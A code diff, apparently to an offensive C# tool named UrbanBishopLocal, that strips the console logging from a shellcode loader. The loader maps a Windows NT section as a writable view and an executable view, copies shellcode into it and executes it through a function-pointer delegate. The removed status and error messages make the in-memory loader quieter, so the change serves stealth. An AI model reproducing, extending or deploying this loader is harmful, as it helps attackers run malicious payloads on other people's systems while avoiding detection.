@@ -46,13 +46,10 @@ namespace UrbanBishopLocal
             UInt32 CallResult = NtCreateSection(ref hSection, 0xe, IntPtr.Zero, ref MaxSize, 0x40, 0x8000000, IntPtr.Zero);
             if (CallResult == 0 && hSection != IntPtr.Zero)
             {
-                Console.WriteLine("    |-> hSection: 0x" + String.Format("{0:X}", (hSection).ToInt64()));
-                Console.WriteLine("    |-> Size: " + ScSize);
                 SectData.hSection = hSection;
             }
             else
             {
-                Console.WriteLine("[!] Failed to create section..");
                 SectData.isvalid = false;
                 return SectData;
             }
@@ -63,13 +60,10 @@ namespace UrbanBishopLocal
             CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x4);
             if (CallResult == 0 && pScBase != IntPtr.Zero)
             {
-                Console.WriteLine("\n[>] Creating first view with PAGE_READWRITE");
-                Console.WriteLine("    |-> pBase: 0x" + String.Format("{0:X}", (pScBase).ToInt64()));
                 SectData.pBase = pScBase;
             }
             else
             {
-                Console.WriteLine("[!] Failed to map section locally..");
                 SectData.isvalid = false;
                 return SectData;
             }
@@ -80,13 +74,10 @@ namespace UrbanBishopLocal
             CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase2, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x20);
             if (CallResult == 0 && pScBase != IntPtr.Zero)
             {
-                Console.WriteLine("\n[>] Creating second view with PAGE_EXECUTE_READ");
-                Console.WriteLine("    |-> pBase: 0x" + String.Format("{0:X}", (pScBase2).ToInt64()));
                 SectData.pBase = pScBase2;
             }
             else
             {
-                Console.WriteLine("[!] Failed to map section locally..");
                 SectData.isvalid = false;
                 return SectData;
             }
@@ -117,14 +108,12 @@ namespace UrbanBishopLocal
             }
 
             // Create local section, map two views RW + RX, copy shellcode to RW
-            Console.WriteLine("\n[>] Creating local section..");
             SECT_DATA LocalSect = MapLocalSectionAndWrite(ShellCode);
             if (!LocalSect.isvalid)
             {
                 return;
             }
 
-            Console.WriteLine("\n[>] Triggering shellcode using delegate!");
             Initialize del = (Initialize)Marshal.GetDelegateForFunctionPointer(LocalSect.pBase, typeof(Initialize));
             del();
 
